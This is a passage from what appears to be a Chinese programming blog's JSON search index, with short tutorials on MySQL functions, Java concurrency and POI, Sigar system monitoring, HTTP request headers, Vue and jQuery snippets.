emp.deptno=d.deptno GROUP BY deptno) con, (SELECT AVG(sal) FROM emp WHERE emp.deptno=d.deptno GROUP BY deptno) avgsalFROM dept d","categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://blog.dragon-yuan.me/categories/MySQL/"}],"tags":[]},{"title":"VueJS中的各项绑定(不定期更新)","slug":"vue-bind","date":"2017-07-13T15:19:22.000Z","updated":"2017-07-25T14:11:26.676Z","comments":true,"path":"2017/07/13/vue-bind/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/13/vue-bind/","excerpt":"","text":"img的src属性绑定url变量1&lt;img v-bind:src=\"imgUrl\"/&gt; DOM元素绑定不可用1:disabled=\"$route.query.type == 'edit'","categories":[{"name":"web","slug":"web","permalink":"http://blog.dragon-yuan.me/categories/web/"}],"tags":[]},{"title":"MySQL中CONVERT","slug":"mysql-convert","date":"2017-07-12T15:19:22.000Z","updated":"2017-07-12T15:23:47.712Z","comments":true,"path":"2017/07/12/mysql-convert/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/12/mysql-convert/","excerpt":"","text":"CONVERT类型转换：CONVERT(VALUE,TYPE)可用的类型：二进制：BINARY字符串，可以带参数：CHAR()日期：DATE时间：TIME日期时间型：DATETIME浮点数：DECIMAL整数：SIGNED无符号整数：UNSIGNED","categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://blog.dragon-yuan.me/categories/MySQL/"}],"tags":[]},{"title":"AtomicBoolean介绍与使用","slug":"java-AtomicBoolean","date":"2017-07-12T14:52:26.000Z","updated":"2017-07-12T15:15:19.236Z","comments":true,"path":"2017/07/12/java-AtomicBoolean/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/12/java-AtomicBoolean/","excerpt":"","text":"AtomicBoolean是Java.util.concurrent.atomic包下的原子变量，这个包里面提供了一组原子类。其基本的特性就是在多线程环境下，当有多个线程同时执行这些类的实例包含的方法时，具有排他性，即当某个线程进入方法，执行其中的指令时，不会被其他线程打断，而别的线程就像自旋锁一样，一直等到该方法执行完成，才由JVM从等待队列中选择一个另一个线程进入，这只是一种逻辑上的理解。实际上是借助硬件的相关指令来实现的，不会阻塞线程(或者说只是在硬件级别上阻塞了)。 例如AtomicBoolean，在这个Boolean值的变化的时候不允许在之间插入，保持操作的原子性。方法和举例：compareAndSet(boolean expect, boolean update)。这个方法主要两个作用: 比较AtomicBoolean和expect的值，如果一致，执行方法内的语句。其实就是一个if语句。 把AtomicBoolean的值设成update。较最要的是这两件事是一气呵成的，这连个动作之间不会被打断，任何内部或者外部的语句都不可能在两个动作之间运行。为多线程的控制提供了解决的方案。 123456789101112131415161718192021222324252627282930313233343536373839import java.util.concurrent.TimeUnit;public class BarWorker implements Runnable &#123; private static boolean exists = false; private String name; public BarWorker(String name) &#123; this.name = name; &#125; @Override public void run() &#123; if (!exists) &#123; try &#123; TimeUnit.SECONDS.sleep(1); &#125; catch (InterruptedException e1) &#123; // do nothing &#125; exists = true; System.out.println(name + \" enter\"); try &#123; System.out.println(name + \" working\"); TimeUnit.SECONDS.sleep(2); &#125; catch (InterruptedException e) &#123; // do nothing &#125; System.out.println(name + \" leave\"); exists = false; &#125; else &#123; System.out.println(name + \" give up\"); &#125; &#125; public static void main(String[] args) &#123; BarWorker bar1 = new BarWorker(\"bar1\"); BarWorker bar2 = new BarWorker(\"bar2\"); new Thread(bar1).start(); new Thread(bar2).start(); &#125;&#125; 输出如下：bar1 enterbar2 enterbar1 workingbar2 workingbar1 leavebar2 leave 用AtomicBoolean进行线程同步，代码如下：12345678910111213141516171819202122232425262728293031323334import java.util.concurrent.TimeUnit;import java.util.concurrent.atomic.AtomicBoolean;public class BarWorker2 implements Runnable &#123; private static AtomicBoolean exists = new AtomicBoolean(false); private String name; public BarWorker2(String name) &#123; this.name = name; &#125; @Override public void run() &#123; if (exists.compareAndSet(false, true)) &#123; System.out.println(name + \" enter\"); try &#123; System.out.println(name + \" working\"); TimeUnit.SECONDS.sleep(2); &#125; catch (InterruptedException e) &#123; // do nothing &#125; System.out.println(name + \" leave\"); exists.set(false); &#125; else &#123; System.out.println(name + \" give up\"); &#125; &#125; public static void main(String[] args) &#123; BarWorker2 bar1 = new BarWorker2(\"bar1\"); BarWorker2 bar2 = new BarWorker2(\"bar2\"); new Thread(bar1).start(); new Thread(bar2).start(); &#125;&#125; 执行结果如下：bar1 enterbar1 workingbar2 give upbar1 leave 可以看出仅仅一个线程进行工作，因为exists.compareAndSet(false, true)提供了原子性操作，比较和赋值操作组成了一个原子操作, 中间不会提供可乘之机。","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"CharSequence类型","slug":"java-charqequence","date":"2017-07-12T13:52:26.000Z","updated":"2017-07-12T15:07:32.633Z","comments":true,"path":"2017/07/12/java-charqequence/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/12/java-charqequence/","excerpt":"","text":"String是Java中的字符串，它继承于CharSequence。String继承于CharSequence，也就是说String也是CharSequence类型。CharSequence是一个接口，它只包括length(),charAt(int),subSequence(int,int)这几个API接口。除了String实现了CharSequence之外，StringBuffer和StringBuilder也实现了CharSequence接口。需要说明的是，CharSequence就是字符序列。String, StringBuilder和StringBuffer本质上都是通过字符数组实现的。 对于一个抽象类或者是接口类，不能使用new来进行赋值，但是可通过下面的方式来进行实例的创建：1CharSequence cs=\"hello\"; 但是不能这样来创建：1CharSequence cs=new CharSequence(\"hello\"); 1234// 比较字符串是否相等public static boolean equals(CharSequence cs1, CharSequence cs2) &#123; return cs1 == cs2?true:(cs1 != null &amp;&amp; cs2 != null?(cs1 instanceof String &amp;&amp; cs2 instanceof String?cs1.equals(cs2):CharSequenceUtils.regionMatches(cs1, false, 0, cs2, 0, Math.max(cs1.length(), cs2.length()))):false);&#125;","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"浅析VO、DTO、DO、PO的概念、区别和用处","slug":"java-dto-vo","date":"2017-07-11T13:52:26.000Z","updated":"2017-07-11T13:50:18.871Z","comments":true,"path":"2017/07/11/java-dto-vo/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/11/java-dto-vo/","excerpt":"","text":"VO（View Object）：视图对象，用于展示层，它的作用是把某个指定页面（或组件）的所有数据封装起来。 DTO（Data Transfer Object）：数据传输对象，这个概念来源于J2EE的设计模式，原来的目的是为了EJB的分布式应用提供粗粒度的数据实体，以减少分布式调用的次数，从而提高分布式调用的性能和降低网络负载，但在这里，我泛指用于展示层与服务层之间的数据传输对象。 DO（Domain Object）：领域对象，就是从现实世界中抽象出来的有形或无形的业务实体。 PO（Persistent Object）：持久化对象，它跟持久层（通常是关系型数据库）的数据结构形成一一对应的映射关系，如果持久层是关系型数据库，那么，数据表中的每个字段（或若干个）就对应PO的一个（或若干个）属性。 DTO和VO：DTO和VO的属性值基本是一致的，而且他们通常都是POJO，因此没必要多此一举，但不要忘记这是实现层面的思维，对于设计层面来说，概念上还是应该存在VO和DTO，因为两者有着本质的区别，DTO代表服务层需要接收的数据和返回的数据，而VO代表展示层需要显示的数据。","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"HTTP中Request-Headers详解","slug":"http-request-headers","date":"2017-07-11T12:52:38.000Z","updated":"2017-07-11T13:31:53.623Z","comments":true,"path":"2017/07/11/http-request-headers/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/11/http-request-headers/","excerpt":"","text":"Request Headers：Accept作用：浏览器端可以接受的媒体类型,例如：Accept: text/html 代表浏览器可以接受服务器回发的类型为 text/html也就是我们常说的html文档,如果服务器无法返回text/html类型的数据,服务器应该返回一个406错误(non acceptable)通配符 代表任意类型例如 Accept: /* 代表浏览器可以处理所有类型,(一般浏览器发给服务器都是发这个) Accept-Encoding：作用：浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate）例如： Accept-Encoding: gzip, deflate Accept-Language：作用：浏览器申明自己接收的语言。语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等例如： Accept-Language: en-us或zh-CN User-Agent：作用：告诉HTTP服务器， 客户端使用的操作系统和浏览器的名称和版本.我们上网登陆论坛的时候，往往会看到一些欢迎信息，其中列出了你的操作系统的名称和版本，你所使用的浏览器的名称和版本，服务器应用程序就是从User-Agent这个请求报头域中获取到这些信息User-Agent请求报头域允许客户端将它的操作系统、浏览器和其它属性告诉服务器。例如： User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 Referer：作用：提供了Request的上下文信息的服务器，告诉服务器是从哪个链接过来的 Origin：作用：告诉Request服务是从何处过来的 Host：作用：请求报头域主要用于指定被请求资源的Internet主机和端口号它通常从URL中提取出来的 Cookie：作用：最重要的header, 将cookie的值发送给HTTP服务器Cookie通过URL编码形式发送，转码网站：http://tool.chinaz.com/tools/urlencode.aspx Content-Length：作用：发送给HTTP服务器数据的长度例如：Content-Length: 38 Content-Type：作用：发送给HTTP服务器数据的类型例如：Content-Type: application/json;charset=UTF-8 Connection：例如：Connection: keep-alive当一个网页打开完成后，客户端和服务器之间用于传输HTTP数据的TCP连接不会关闭，如果客户端再次访问这个服务器上的网页，会继续使用这一条已经建立的连接例如：Connection: close代表一个Request完成后，客户端和服务器之间用于传输HTTP数据的TCP连接会关闭，当客户端再次发送Request，需要重新建立TCP连接。 Authorization：Authorization消息头的用户名和口令的值可以容易地编码和解码，通过Base64例如：客户端的请求（用户名“”Aladdin”，口令, password “open sesame”）Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==print encode_base64(‘Aladdin:open sesame’), “\\n”;print decode_base64(‘QWxhZGRpbjpvcGVuIHNlc2FtZQ==’), “\\n”;","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"MySQL中CONCAT值为空的问题解决办法","slug":"java-mysql-concat","date":"2017-07-10T14:12:26.000Z","updated":"2017-07-12T15:19:31.282Z","comments":true,"path":"2017/07/10/java-mysql-concat/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/10/java-mysql-concat/","excerpt":"","text":"1234567在MySQL中concat函数有一个特点就是有一个值为null那么不管第二个字符有多少内容都返回为空了，这个特性让我们在实例应用中可能觉得不方便，但实现就是这样我们需要使用其它办法来解决。返回结果为连接参数产生的字符串。如有任何一个参数为NULL，则返回值为NULL。使用个IFNULL可以判断一下字段是否为空：MySQL内置的IFNULL函数可以用在查询时候为NULL值字段给一个默认值：SELECT CONCAT(IFNULL(code,''),telephone) FROM info","categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://blog.dragon-yuan.me/categories/MySQL/"}],"tags":[]},{"title":"通过JAVA环境监听Linux系统属性","slug":"java-linux-properties","date":"2017-04-10T12:22:26.000Z","updated":"2017-04-10T13:02:08.746Z","comments":true,"path":"2017/04/10/java-linux-properties/","link":"","permalink":"http://blog.dragon-yuan.me/2017/04/10/java-linux-properties/","excerpt":"","text":"获取当前系统内存和CPU使用状态123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import org.hyperic.sigar.Mem;import java.io.*;import java.util.StringTokenizer;public final class LinuxSystemTool &#123; /** * @return int[] result * result.length==4;int[0]=MemTotal;int[1]=MemFree;int[2]=SwapTotal;int[3]=SwapFree; */ public static int[] getMemInfo() throws IOException, InterruptedException &#123; File file = new File(\"/proc/meminfo\"); BufferedReader br = new BufferedReader(new InputStreamReader( new FileInputStream(file))); int[] result = new int[4]; String str = null; StringTokenizer token = null; while((str = br.readLine()) != null) &#123; token = new StringTokenizer(str); if(!token.hasMoreTokens()) continue; str = token.nextToken(); if(!token.hasMoreTokens()) continue; if(str.equalsIgnoreCase(\"MemTotal:\")) result[0] = Integer.parseInt(token.nextToken()); else if(str.equalsIgnoreCase(\"MemFree:\")) result[1] = Integer.parseInt(token.nextToken()); else if(str.equalsIgnoreCase(\"SwapTotal:\")) result[2] = Integer.parseInt(token.nextToken()); else if(str.equalsIgnoreCase(\"SwapFree:\")) result[3] = Integer.parseInt(token.nextToken()); &#125; return result; &#125; public static float getCpuInfo() throws IOException, InterruptedException &#123; File file = new File(\"/proc/stat\"); BufferedReader br = new BufferedReader(new InputStreamReader( new FileInputStream(file))); StringTokenizer token = new StringTokenizer(br.readLine()); token.nextToken(); int user1 = Integer.parseInt(token.nextToken()); int nice1 = Integer.parseInt(token.nextToken()); int sys1 = Integer.parseInt(token.nextToken()); int idle1 = Integer.parseInt(token.nextToken()); Thread.sleep(1000); br = new BufferedReader( new InputStreamReader(new FileInputStream(file))); token = new StringTokenizer(br.readLine()); token.nextToken(); int user2 = Integer.parseInt(token.nextToken()); int nice2 = Integer.parseInt(token.nextToken()); int sys2 = Integer.parseInt(token.nextToken()); int idle2 = Integer.parseInt(token.nextToken()); return (float)((user2 + sys2 + nice2) - (user1 + sys1 + nice1)) / (float)((user2 + nice2 + sys2 + idle2) - (user1 + nice1 + sys1 + idle1)); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"通过JAVA环境使用sigar监听Windows系统属性","slug":"java-windows-properties","date":"2017-04-10T12:12:26.000Z","updated":"2017-04-10T13:21:11.997Z","comments":true,"path":"2017/04/10/java-windows-properties/","link":"","permalink":"http://blog.dragon-yuan.me/2017/04/10/java-windows-properties/","excerpt":"","text":"使用sigar开源组件，获取当前系统各项属性1.下载sigar.jar2.将sigar-amd64-winnt.dll，sigar-x86-winnt.dll，sigar-x86-winnt.lib复制到JDK的bin目录下，使sigar拥有运行依赖。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215import org.hyperic.sigar.*;import java.net.InetAddress;import java.net.UnknownHostException;import java.util.Map;import java.util.Properties;public class WindowsSystemTool &#123; public static void main(String[] args) &#123; try &#123; property(); cpu(); memory(); os(); who(); file(); net(); ethernet(); &#125; catch (Exception e1) &#123; e1.printStackTrace(); &#125; &#125; private static void property() throws UnknownHostException &#123; Runtime r = Runtime.getRuntime(); Properties props = System.getProperties(); InetAddress addr; addr = InetAddress.getLocalHost(); String ip = addr.getHostAddress(); Map&lt;String, String&gt; map = System.getenv(); String userName = map.get(\"USERNAME\"); String computerName = map.get(\"COMPUTERNAME\"); String userDomain = map.get(\"USERDOMAIN\"); System.out.println(\"用户名:\" + userName); System.out.println(\"计算机名:\" + computerName); System.out.println(\"计算机域名:\" + userDomain); System.out.println(\"本地ip地址:\" + ip); System.out.println(\"本地主机名:\" + addr.getHostName()); System.out.println(\"JVM可以使用的总内存:\" + r.totalMemory()); System.out.println(\"JVM可以使用的剩余内存:\" + r.freeMemory()); System.out.println(\"JVM可以使用的处理器个数:\" + r.availableProcessors()); System.out.println(\"Java的运行环境版本：\" + props.getProperty(\"java.version\")); System.out.println(\"Java的运行环境供应商：\" + props.getProperty(\"java.vendor\")); System.out.println(\"Java供应商的URL：\" + props.getProperty(\"java.vendor.url\")); System.out.println(\"Java的安装路径：\" + props.getProperty(\"java.home\")); System.out.println(\"Java的虚拟机规范版本：\" + props.getProperty(\"java.vm.specification.version\")); System.out.println(\"Java的虚拟机规范供应商： \" + props.getProperty(\"java.vm.specification.vendor\")); System.out.println(\"Java的虚拟机规范名称：\" + props.getProperty(\"java.vm.specification.name\")); System.out.println(\"Java的虚拟机实现版本：\" + props.getProperty(\"java.vm.version\")); System.out.println(\"Java的虚拟机实现供应商：\" + props.getProperty(\"java.vm.vendor\")); System.out.println(\"Java的虚拟机实现名称：\" + props.getProperty(\"java.vm.name\")); System.out.println(\"Java运行时环境规范版本：\" + props.getProperty(\"java.specification.version\")); System.out.println(\"Java运行时环境规范供应商：\" + props.getProperty(\"java.specification.vender\")); System.out.println(\"Java运行时环境规范名称：\" + props.getProperty(\"java.specification.name\")); System.out.println(\"Java的类格式版本号：\" + props.getProperty(\"java.class.version\")); System.out.println(\"Java的类路径：\" + props.getProperty(\"java.class.path\")); System.out.println(\"加载库时搜索的路径列表：\" + props.getProperty(\"java.library.path\")); System.out.println(\"默认的临时文件路径：\" + props.getProperty(\"java.io.tmpdir\")); System.out.println(\"一个或多个扩展目录的路径：\" + props.getProperty(\"java.ext.dirs\")); System.out.println(\"操作系统的名称：\" + props.getProperty(\"os.name\")); System.out.println(\"操作系统的构架：\" + props.getProperty(\"os.arch\")); System.out.println(\"操作系统的版本：\" + props.getProperty(\"os.version\")); System.out.println(\"文件分隔符：\" + props.getProperty(\"file.separator\")); System.out.println(\"路径分隔符：\" + props.getProperty(\"path.separator\")); System.out.println(\"行分隔符：\" + props.getProperty(\"line.separator\")); System.out.println(\"用户的账户名称：\" + props.getProperty(\"user.name\")); System.out.println(\"用户的主目录：\" + props.getProperty(\"user.home\")); System.out.println(\"用户的当前工作目录：\" + props.getProperty(\"user.dir\")); &#125; private static void memory() throws SigarException &#123; Sigar sigar = new Sigar(); Mem mem = sigar.getMem(); System.out.println(\"内存总量:\" + mem.getTotal() / 1024L + \"K av\"); System.out.println(\"当前内存使用量:\" + mem.getUsed() / 1024L + \"K used\"); System.out.println(\"当前内存剩余量:\" + mem.getFree() / 1024L + \"K free\"); Swap swap = sigar.getSwap(); System.out.println(\"交换区总量:\" + swap.getTotal() / 1024L + \"K av\"); System.out.println(\"当前交换区使用量:\" + swap.getUsed() / 1024L + \"K used\"); System.out.println(\"当前交换区剩余量:\" + swap.getFree() / 1024L + \"K free\"); &#125; private static void cpu() throws SigarException &#123; Sigar sigar = new Sigar(); CpuInfo infos[] = sigar.getCpuInfoList(); CpuPerc cpuList[] = null; cpuList = sigar.getCpuPercList(); for (int i = 0; i &lt; infos.length; i++) &#123; CpuInfo info = infos[i]; System.out.println(\"第\" + (i + 1) + \"块CPU信息\"); System.out.println(\"CPU的总量MHz:\" + info.getMhz()); System.out.println(\"CPU生产商:\" + info.getVendor()); System.out.println(\"CPU类别:\" + info.getModel()); System.out.println(\"CPU缓存数量:\" + info.getCacheSize()); printCpuPerc(cpuList[i]); &#125; &#125; private static void printCpuPerc(CpuPerc cpu) &#123; System.out.println(\"CPU用户使用率:\" + CpuPerc.format(cpu.getUser())); System.out.println(\"CPU系统使用率:\" + CpuPerc.format(cpu.getSys())); System.out.println(\"CPU当前等待率:\" + CpuPerc.format(cpu.getWait())); System.out.println(\"CPU当前错误率:\" + CpuPerc.format(cpu.getNice())); System.out.println(\"CPU当前空闲率:\" + CpuPerc.format(cpu.getIdle())); System.out.println(\"CPU总的使用率:\" + CpuPerc.format(cpu.getCombined())); &#125; private static void os() &#123; OperatingSystem OS = OperatingSystem.getInstance(); System.out.println(\"操作系统:\" + OS.getArch()); System.out.println(\"操作系统CpuEndian():\" + OS.getCpuEndian());// System.out.println(\"操作系统DataModel():\" + OS.getDataModel());// System.out.println(\"操作系统的描述:\" + OS.getDescription()); System.out.println(\"操作系统名称:\" + OS.getVendorName()); System.out.println(\"操作系统的版本号:\" + OS.getVersion()); &#125; private static void who() throws SigarException &#123; Sigar sigar = new Sigar(); Who who[] = sigar.getWhoList(); if (who != null &amp;&amp; who.length &gt; 0) &#123; for (int i = 0; i &lt; who.length; i++) &#123; Who _who = who[i]; System.out.println(\"用户控制台:\" + _who.getDevice()); System.out.println(\"用户host:\" + _who.getHost()); System.out.println(\"当前系统进程表中的用户名:\" + _who.getUser()); &#125; &#125; &#125; private static void file() throws Exception &#123; Sigar sigar = new Sigar(); FileSystem fslist[] = sigar.getFileSystemList(); for (int i = 0; i &lt; fslist.length; i++) &#123; System.out.println(\"分区的盘符名称\" + i); FileSystem fs = fslist[i]; System.out.println(\"盘符名称: \" + fs.getDevName()); System.out.println(\"盘符路径: \" + fs.getDirName()); System.out.println(\"盘符标志: \" + fs.getFlags());// System.out.println(\"盘符类型: \" + fs.getSysTypeName()); System.out.println(\"盘符类型名: \" + fs.getTypeName()); System.out.println(\"盘符文件系统类型: \" + fs.getType()); FileSystemUsage usage = null; usage = sigar.getFileSystemUsage(fs.getDirName()); switch (fs.getType()) &#123; case 0: break; case 1: break; case 2: // 本地硬盘 System.out.println(fs.getDevName() + \"总大小:\" + usage.getTotal() + \"KB\"); System.out.println(fs.getDevName() + \"剩余大小:\" + usage.getFree() + \"KB\"); System.out.println(fs.getDevName() + \"可用大小:\" + usage.getAvail() + \"KB\"); System.out.println(fs.getDevName() + \"已经使用量:\" + usage.getUsed() + \"KB\"); double usePercent = usage.getUsePercent() * 100D; System.out.println(fs.getDevName() + \"资源的利用率:\" + usePercent + \"%\"); break; case 3:// 网络 break; case 4:// 闪存 break; case 5:// 光驱 break; case 6:// 页面交换 break; &#125; System.out.println(fs.getDevName() + \"读出：\" + usage.getDiskReads()); System.out.println(fs.getDevName() + \"写入：\" + usage.getDiskWrites()); &#125; return; &#125; private static void net() throws Exception &#123; Sigar sigar = new Sigar(); String ifNames[] = sigar.getNetInterfaceList(); for (int i = 0; i &lt; ifNames.length; i++) &#123; String name = ifNames[i]; NetInterfaceConfig ifconfig = sigar.getNetInterfaceConfig(name); System.out.println(\"网络设备名:\" + name); System.out.println(\"IP地址:\" + ifconfig.getAddress()); System.out.println(\"子网掩码:\" + ifconfig.getNetmask()); if ((ifconfig.getFlags() &amp; 1L) &lt;= 0L) &#123; System.out.println(\"!IFF_UP...skipping getNetInterfaceStat\"); continue; &#125; NetInterfaceStat ifstat = sigar.getNetInterfaceStat(name); System.out.println(name + \"接收的总包裹数:\" + ifstat.getRxPackets()); System.out.println(name + \"发送的总包裹数:\" + ifstat.getTxPackets()); System.out.println(name + \"接收到的总字节数:\" + ifstat.getRxBytes()); System.out.println(name + \"发送的总字节数:\" + ifstat.getTxBytes()); System.out.println(name + \"接收到的错误包数:\" + ifstat.getRxErrors()); System.out.println(name + \"发送数据包时的错误数:\" + ifstat.getTxErrors()); System.out.println(name + \"接收时丢弃的包数:\" + ifstat.getRxDropped()); System.out.println(name + \"发送时丢弃的包数:\" + ifstat.getTxDropped()); &#125; &#125; private static void ethernet() throws SigarException &#123; Sigar sigar = null; sigar = new Sigar(); String[] ifaces = sigar.getNetInterfaceList(); for (int i = 0; i &lt; ifaces.length; i++) &#123; NetInterfaceConfig cfg = sigar.getNetInterfaceConfig(ifaces[i]); if (NetFlags.LOOPBACK_ADDRESS.equals(cfg.getAddress()) || (cfg.getFlags() &amp; NetFlags.IFF_LOOPBACK) != 0 || NetFlags.NULL_HWADDR.equals(cfg.getHwaddr())) &#123; continue; &#125; System.out.println(cfg.getName() + \"IP地址:\" + cfg.getAddress()); System.out.println(cfg.getName() + \"网关广播地址:\" + cfg.getBroadcast()); System.out.println(cfg.getName() + \"网卡MAC地址:\" + cfg.getHwaddr()); System.out.println(cfg.getName() + \"子网掩码:\" + cfg.getNetmask()); System.out.println(cfg.getName() + \"网卡描述信息:\" + cfg.getDescription()); System.out.println(cfg.getName() + \"网卡类型\" + cfg.getType()); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"使用JS转换文件路径","slug":"js-replace","date":"2017-03-27T08:22:26.000Z","updated":"2017-09-09T07:47:30.537Z","comments":true,"path":"2017/03/27/js-replace/","link":"","permalink":"http://blog.dragon-yuan.me/2017/03/27/js-replace/","excerpt":"","text":"将Linux文件路径转换为Windows文件路径 filePath = filePath.replace(/\\\\/g, \"/\");","categories":[{"name":"Web Design","slug":"Web-Design","permalink":"http://blog.dragon-yuan.me/categories/Web-Design/"}],"tags":[]},{"title":"lsof-top-free命令","slug":"centos-utils","date":"2017-03-07T09:44:49.000Z","updated":"2017-03-07T09:31:40.495Z","comments":true,"path":"2017/03/07/centos-utils/","link":"","permalink":"http://blog.dragon-yuan.me/2017/03/07/centos-utils/","excerpt":"","text":"top：查看系统资源使用率 free：free -h 查看内存资源 lsof：lsof -i:8080 查看端口使用情况","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"使用JS保留两位小数","slug":"js-parsefloat","date":"2017-03-07T09:22:26.000Z","updated":"2017-09-09T07:47:27.666Z","comments":true,"path":"2017/03/07/js-parsefloat/","link":"","permalink":"http://blog.dragon-yuan.me/2017/03/07/js-parsefloat/","excerpt":"","text":"由于js显示的值为varchar类型，所以显示小数需要转换成float类型，并用toFixed保留位数 parseFloat(value).toFixed(2)","categories":[{"name":"Web Design","slug":"Web-Design","permalink":"http://blog.dragon-yuan.me/categories/Web-Design/"}],"tags":[]},{"title":"APACHE POI写入Word-07操作","slug":"poi-write-word07","date":"2017-02-23T07:22:26.000Z","updated":"2017-02-23T07:52:29.210Z","comments":true,"path":"2017/02/23/poi-write-word07/","link":"","permalink":"http://blog.dragon-yuan.me/2017/02/23/poi-write-word07/","excerpt":"","text":"// 使用POI读取模版 MSWordTool changer = new MSWordTool(); changer.setTemplate(templatePath); // 导入书签 Map wordContent = getContent(); // 替换文件 changer.replaceBookMark(wordContent); changer.saveAs(\"path\"); // 获取书签数据 private Map getContent(){ Map content = new HashMap(); try { content.put(\"A1\", obj); } catch (Exception ex) { ex.printStackTrace(); } return content; } /** * 为文档设置模板 * @param templatePath 模板文件路径 */ public void setTemplate(String templatePath) { try { this.document = new XWPFDocument(POIXMLDocument.openPackage(templatePath)); bookMarks = new BookMarks(document); } catch (IOException e) { e.printStackTrace(); } } /** * 进行标签替换的例子,传入的Map中，key表示标签名称，value是替换的信息 * @param indicator */ public void replaceBookMark(Map indicator) { //循环进行替换 Iterator bookMarkIter = bookMarks.getNameIterator(); while (bookMarkIter.hasNext()) { String bookMarkName = bookMarkIter.next(); //得到标签名称 BookMark bookMark = bookMarks.getBookmark(bookMarkName); //进行替换 if (indicator.get(bookMarkName)!=null) { bookMark.insertTextAtBookMark(indicator.get(bookMarkName), BookMark.INSERT_BEFORE); } } } public void saveAs(String path) { File newFile = new File(path); FileOutputStream fos = null; try { fos = new FileOutputStream(newFile); } catch (FileNotFoundException e) { e.printStackTrace(); } try { this.document.write(fos); fos.flush(); fos.close(); } catch (IOException e) { e.printStackTrace(); } }","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"APACHE POI写入Excel-07操作","slug":"poi-write-excel","date":"2017-02-22T06:22:26.000Z","updated":"2017-02-23T07:04:35.897Z","comments":true,"path":"2017/02/22/poi-write-excel/","link":"","permalink":"http://blog.dragon-yuan.me/2017/02/22/poi-write-excel/","excerpt":"","text":"// 创建Excel工作簿 XSSFWorkbook workBook = new XSSFWorkbook(); // 创建一个工作薄对象 XSSFSheet sheet = workBook.createSheet(\"sheet1\"); // 设置单元格宽度 sheet.setDefaultColumnWidth(20); // 画表 XSSFRow row_1 = sheet.createRow(0); XSSFCell cell_1_0 = row_1.createCell(0); XSSFCell cell_1_1 = row_1.createCell(1); cell_1_0.setCellValue(\"value\"); cell_1_1.setCellValue(\"value\"); // 写入文件 File file = new File(\"\"); file.createNewFile(); FileOutputStream os = FileUtils.openOutputStream(file); workBook.write(os); os.close();","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"APACHE POI读取Excel-07操作","slug":"poi-read-excel","date":"2017-02-22T06:14:26.000Z","updated":"2017-02-23T06:25:12.028Z","comments":true,"path":"2017/02/22/poi-read-excel/","link":"","permalink":"http://blog.dragon-yuan.me/2017/02/22/poi-read-excel/","excerpt":"","text":"// 得到Excel工作簿对象 XSSFWorkbook workbook = new XSSFWorkbook(new FileInputStream(file)); // 得到Excel工作表对象 XSSFSheet sheet = workbook.getSheetAt(0); // 遍历工作表中行 for (Row row : sheet) { // 获取当行数 int rowNum = row.getRowNum(); // 跳过第一行，如导入Excel模版 if (rowNum != 0) { // 获取此行上的单元格 Cell cell = row.getCell(0); // 得到Excel工作表指定行的单元格，并设置读取编码方式 cell.setCellType(HSSFCell.CELL_TYPE_STRING); row.getCell(1).setCellType(HSSFCell.CELL_TYPE_STRING); row.getCell(2).setCellType(HSSFCell.CELL_TYPE_STRING); row.getCell(3).setCellType(HSSFCell.CELL_TYPE_STRING); // 获取内容 String str1 = cell.getStringCellValue(); String str2 = row.getCell(1).getStringCellValue(); String str3 = row.getCell(2).getStringCellValue(); } } 此方法没有处理异常，请自行添加","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"2017 - Dragon's Life","slug":"gallery-mylife-2017","date":"2016-12-31T16:00:00.000Z","updated":"2017-12-31T14:31:20.017Z","comments":true,"path":"2017/01/01/gallery-mylife-2017/","link":"","permalink":"http://blog.dragon-yuan.me/2017/01/01/gallery-mylife-2017/","excerpt":"","text":"","categories":[{"name":"Gallery","slug":"Gallery","permalink":"http://blog.dragon-yuan.me/categories/Gallery/"}],"tags":[]},{"title":"jQuery对DOM元素的操作","slug":"jquery-DOM","date":"2016-12-07T14:14:26.000Z","updated":"2017-09-05T15:40:22.127Z","comments":true,"path":"2016/12/07/jquery-DOM/","link":"","permalink":"http://blog.dragon-yuan.me/2016/12/07/jquery-DOM/","excerpt":"","text":"获取单选按钮的值 $('input[name=\"object\"]:checked').val(); 获取select选中的值 $(\"#object\").find(\"option:selected\").val(); 判断是不是空 $.trim($(\"#object\").val()) == 